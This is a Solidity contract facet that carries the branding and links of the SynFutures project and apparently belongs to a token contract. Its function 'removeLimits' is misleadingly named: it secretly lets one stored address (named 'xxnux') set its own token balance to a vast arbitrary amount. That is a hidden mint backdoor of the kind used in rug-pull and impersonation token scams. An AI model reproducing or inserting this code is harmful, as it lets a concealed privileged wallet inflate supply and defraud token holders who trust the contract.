/*
 * SPDX-License-Identifier: MIT
 * Website: https://www.synfutures.com/
 * Whitepaper: https://www.synfutures.com/v3-whitepaper.pdf
 * Twitter: https://twitter.com/SynFuturesDefi
 * Telegram Group: https://t.me/synfutures_Defi
 * Discord Chat: https://discord.com/invite/qMX2kcQk7A
 * Medium: https://medium.com/synfutures
 */
pragma solidity ^0.8.23;
import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
